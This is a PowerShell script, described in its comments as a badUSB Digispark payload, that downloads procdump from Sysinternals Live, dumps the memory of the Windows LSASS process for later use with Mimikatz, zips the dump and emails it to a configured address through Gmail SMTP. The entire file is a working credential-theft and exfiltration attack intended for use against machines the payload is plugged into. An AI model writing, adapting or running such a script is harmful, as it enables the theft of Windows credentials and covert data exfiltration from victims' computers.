# started this script for a badUSB Digispark project.
# script for retrieving dump from lsass for later use with mimikatz.

# setup variables
$GmailAccount = ''
$GmailPassWord = ''
$FromAddress = ''
$ToAddress = ''
$Subject = 'Send LSASS Dump'
$Attachment = 'C:\Windows\Temp\dump.zip'

# Sysinternals Live procdump and outfile
$x86 = 'https://live.sysinternals.com/tools/procdump.exe'
$86 = 'procd32.exe'
$x64 = 'https://live.sysinternals.com/tools/procdump64.exe'
$64 = 'procd64.exe'

# set working directory
Set-Location -Path $env:tmp -PassThru
    New-Item dump -ItemType Directory -Force
    New-Item dump.zip -ItemType File -Force

# determine OS and download correct version
$OS = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
    If ($OS -match '64'){(Invoke-WebRequest -Uri $x64 -OutFile $64)} 
        Else {(Invoke-WebRequest -Uri $x86 -OutFile $86)}

# make the lsass dump with the correct version
    If ($OS -match '64'){(Invoke-Command -ScriptBlock {procd64.exe -ma -o lsass.exe lsass -accepteula})}
        Else {(Invoke-Command -ScriptBlock {procd32.exe -ma -o lsass.exe lsass -accepteula})}

# dump is created. copy, compress and move
$src = Resolve-Path $env:tmp\dump 
$dst = Resolve-Path $env:tmp\dump.zip
    Copy-Item lsass.dmp $env:tmp\dump
         If(Test-path $dst) {Remove-item $dst}
        Add-Type -assembly "system.io.compression.filesystem"
        [io.compression.zipfile]::CreateFromDirectory($src, $dst)
        
    Move-Item $env:tmp\dump.zip $Attachment

# setup the mail server and mail file
$SMTPServer = 'smtp.gmail.com'
$SMTP = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTP.EnableSsl = $true
$SMTP.Credentials = New-Object System.Net.NetworkCredential($GmailAccount,$GmailPassWord)
$Message = New-Object System.Net.Mail.MailMessage
$Message.From = $FromAddress
$Message.To.Add($ToAddress)
$Message.Subject = $Subject
$Message.IsBodyHtml = $True
$Attach = new-object Net.Mail.Attachment($Attachment)
$Message.Attachments.Add($Attach)
$SMTP.Send($Message)